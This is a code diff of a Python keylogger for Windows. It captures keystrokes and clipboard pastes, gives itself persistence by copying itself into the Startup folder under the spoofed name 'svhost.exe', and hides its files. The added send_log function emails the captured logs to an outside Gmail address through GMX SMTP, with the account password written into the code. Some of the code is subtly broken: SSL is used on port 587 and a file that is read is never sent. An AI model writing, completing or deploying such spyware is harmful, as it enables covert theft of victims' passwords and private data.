@@ -7,7 +7,9 @@ from pynput.keyboard import Key, Listener
 from time import sleep
 from sys import argv
 from os import getlogin, getenv, path
-
+from cryptography import fernet
+import smtplib
+from email.message import EmailMessage
 
 def win_main():
     clipboard_thread = Thread(target=monitor_clipboard)
@@ -22,13 +24,11 @@ def press(key):
     if key == Key.enter:
         logger1.info("ENTER EVENT\t\t" + get_current_windows() + "\t\t" + ''.join(str(last_keys)))
         logger2.info("ENTER EVENT\t\t" + get_current_windows() + "\t\t" + ''.join(str(last_keys)))
-
     else:
         try:
             if last_keys[-1] == Key.ctrl_l and key.char == 'v':
                 logger1.info("PASTE EVENT\t\t" + get_current_windows() + "\t\t" + get_clipboard_data())
                 logger2.info("PASTE EVENT\t\t" + get_current_windows() + "\t\t" + get_clipboard_data())
-
         except (AttributeError, IndexError):
             pass
 
@@ -77,8 +77,8 @@ def monitor_clipboard():
 
 def ensure_startup():
     paths = ["C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svhost.exe",
-             getenv("TEMP") + "\\svhost.exe",
-             getenv("APPDATA") + "\\svhost.exe"]
+             getenv("TEMP") + "\\testmake.exe",
+             getenv("APPDATA") + "\\testmake.exe"]
 
     if not path.exists(paths[0]):
         with open(argv[0], "rb")as file:
@@ -95,11 +95,31 @@ def ensure_startup():
             SetFileAttributes(p, 2)
     return paths[1:]
 
+def send_log():
+    with open(paths[0], "rb")as f:
+        c1 = f.read()
+    with open(paths[1], "rb")as f:
+        c2 = f.read()
+
+    email = "LuckyLuke1200@gmx.de"
+    pw = "L3s5U96aAT2yjks"
+
+    msg = EmailMessage()
+    msg['From'] = email
+    msg['To'] = "schlusseldieb@gmail.com"
+
+    msg.add_attachment(c1, maintype="application", subtype="executable")
+
+    with smtplib.SMTP_SSL("mail.gmx.net", 587)as f:
+        f.login(email, pw)
+        f.send(msg)
 
 
-paths = ensure_startup()
+#paths = ensure_startup()
+paths =[getenv("TEMP") + "\\testmake.exe", getenv("APPDATA") + "\\testmake.exe"]
 last_keys = []
 logger1 = setup_logger("1", paths[0])
 logger2 = setup_logger("2", paths[1])
-win_main()
+send_log()
+#win_main()
 
